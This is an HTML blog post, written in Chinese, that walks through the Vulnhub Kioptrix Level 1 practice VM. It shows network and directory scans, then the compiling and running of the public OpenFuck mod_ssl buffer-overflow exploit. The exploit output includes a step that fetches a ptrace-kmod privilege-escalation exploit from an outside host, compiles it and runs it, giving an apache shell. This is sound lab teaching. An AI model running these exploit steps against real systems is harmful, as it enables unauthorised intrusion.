@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lucifiel">
+
+
+
+
+    <meta name="keywords" content="Lucifiel, 路西菲尔, Hackthebox, HTB, 渗透测试, 靶场, 靶机, 黑客, Peneration, OSCP, Vulnhub, Vulhub, HackMe, HackTry, Kali, Hacker">
+
+
+<title>Vulnhub - Kioptrix Level 1 靶场实战 | Lucifiel&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lucifiel&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Lucifiel&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub - Kioptrix Level 1 靶场实战</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lucifiel</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 13, 2021&nbsp;&nbsp;8:36:20</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</span><br><span class="line">这个Kioptrix VM Image是很容易的挑战。游戏的目的是通过任何可能的手段获得root权限（除了实际入侵VM服务器或玩家）。这些游戏的目的是学习漏洞评估和利用方面的基本工具和技术。成功完成这些挑战的方法有很多。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下载地址</span><br><span class="line">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</span><br></pre></td></tr></table></figure>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用arp获取靶机的IP地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.</span><br><span class="line"></span><br><span class="line">9 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded</span><br></pre></td></tr></table></figure>
+
+<p>确定靶机IP地址为192.168.1.102，使用nmap进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST</span><br><span class="line">Nmap scan report for 192.168.1.102</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 65529 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2            111/tcp   rpcbind</span><br><span class="line">|   100000  2            111/udp   rpcbind</span><br><span class="line">|   100024  1           1024/tcp   status</span><br><span class="line">|_  100024  1           1024/udp   status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-09-26T09:32:06</span><br><span class="line">|_Not valid after:  2010-09-26T09:32:06</span><br><span class="line">|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.</span><br><span class="line">| sslv2:</span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers:</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:55:CB:15 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1h01m54s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.42 ms 192.168.1.102</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds</span><br></pre></td></tr></table></figure>
+
+<p>这东西稍微的有点多，一个个看</p>
+<img src="/2021/11/13/Kioptrix/image1.png" class="">
+
+<p>80端口好像也没啥可看的？扫个目录看看吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.102/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 200</span><br><span class="line">[+] Wordlist:                /usr/share/dirb/wordlists/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Expanded:                true</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/12 07:52:42 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">http://192.168.1.102/.htaccess            (Status: 403) [Size: 273]</span><br><span class="line">http://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]</span><br><span class="line">http://192.168.1.102/.hta                 (Status: 403) [Size: 268]</span><br><span class="line">http://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]</span><br><span class="line">http://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]</span><br><span class="line">http://192.168.1.102/.hta.php             (Status: 403) [Size: 272]</span><br><span class="line">http://192.168.1.102/~root                (Status: 403) [Size: 269]</span><br><span class="line">http://192.168.1.102/~operator            (Status: 403) [Size: 273]</span><br><span class="line">http://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]</span><br><span class="line">http://192.168.1.102/index.html           (Status: 200) [Size: 2890]</span><br><span class="line">http://192.168.1.102/manual               (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/]</span><br><span class="line">http://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/]</span><br><span class="line">http://192.168.1.102/usage                (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/]</span><br><span class="line">http://192.168.1.102/test.php             (Status: 200) [Size: 27]</span><br></pre></td></tr></table></figure>
+
+<p>挨个去看看</p>
+<img src="/2021/11/13/Kioptrix/image2.png" class="">
+
+<p>几个页面都会跳转到127.0.0.1，只有test.php可以访问，而且还没什么东西</p>
+<p>继续回到端口看看吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# smbclient -L 192.168.1.102                                                                                                            1 ⨯</span><br><span class="line">protocol negotiation failed: NT_STATUS_IO_TIMEOUT</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看到80端口后面的mod_ssl&#x2F;2.8.4，去搜一下有没有Exploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# searchsploit mod_ssl</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                              |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Apache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txt</span><br><span class="line">Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txt</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;OpenFuck.c&#x27; Remote Buffer Overflow                                        | unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;OpenFuckV2.c&#x27; Remote Buffer Overflow (1)                                  | unix/remote/764.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;OpenFuckV2.c&#x27; Remote Buffer Overflow (2)                                  | unix/remote/47080.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#x27;openssl-too-open.c&#x27; SSL2 KEY_ARG Overflow                | unix/remote/40347.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>对比mod_ssl&#x2F;2.8.4版本，有三个版本合适，挨个进行测试</p>
+<p>经过测试发现unix&#x2F;remote&#x2F;47080.c是可以使用的，咱们给他复制出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# locate unix/remote/47080.c</span><br><span class="line">/usr/share/exploitdb/exploits/unix/remote/47080.c</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./</span><br></pre></td></tr></table></figure>
+
+<p>然后使用gcc进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# gcc -o exploit 47080.c -lcrypto</span><br><span class="line">47080.c:21:10: fatal error: openssl/ssl.h: 没有那个文件或目录</span><br><span class="line">   21 | #include &lt;openssl/ssl.h&gt;</span><br><span class="line">      |          ^~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
+
+<p>提示报错了，经过百度搜索，发现是缺少了组件</p>
+<p>咱们使用apt进行安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# apt-get install libssl1.0-dev</span><br></pre></td></tr></table></figure>
+
+<p>然后再进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# gcc -o exploit 47080.c -lcrypto</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# ls</span><br><span class="line">47080.c  exploit</span><br></pre></td></tr></table></figure>
+
+<p>去运行一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# ./exploit</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">: Usage: ./exploit target box [port] [-c N]</span><br><span class="line"></span><br><span class="line">  target - supported box eg: 0x00</span><br><span class="line">  box - hostname or IP address</span><br><span class="line">  port - port for ssl connection</span><br><span class="line">  -c open N connections. (use range 40-50 if u dont know)</span><br></pre></td></tr></table></figure>
+
+<p>运行后得到了运行参数，咱们还得先找到对应的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# ./exploit | grep apache-1.3.20                                                                                                        1 ⨯</span><br><span class="line">        0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">        0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">        0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span><br><span class="line">        0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">        0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br></pre></td></tr></table></figure>
+
+<p>符合条件的有两个，分别是0x6a和0x6b，分别去测试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# ./exploit 0x6a 192.168.1.102 -c 40</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f8070</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">Good Bye!</span><br></pre></td></tr></table></figure>
+
+<p>0x6a测试失败，现在去测试一下0x6b</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop]</span><br><span class="line">└─# ./exploit 0x6b 192.168.1.102 -c 40</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f81e8</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$</span><br><span class="line">d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo</span><br><span class="line">--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line"></span><br><span class="line">Unable to establish SSL connection.</span><br><span class="line"></span><br><span class="line">Unable to establish SSL connection.</span><br><span class="line">gcc: ptrace-kmod.c: No such file or directory</span><br><span class="line">gcc: No input files</span><br><span class="line">rm: cannot remove `ptrace-kmod.c&#x27;: No such file or directory</span><br><span class="line">bash: ./exploit: No such file or directory</span><br><span class="line">bash-2.05$</span><br><span class="line">bash-2.05$ whoami&amp;&amp;id</span><br><span class="line">whoami&amp;&amp;id</span><br><span class="line">apache</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></pre></td></tr></table></figure>
+
+<p>0x6b成功getshell，现在去提权</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>经过测试后没有发现提权的点，但是发现了另一种root权限的方法，那就是用msf的模块</p>
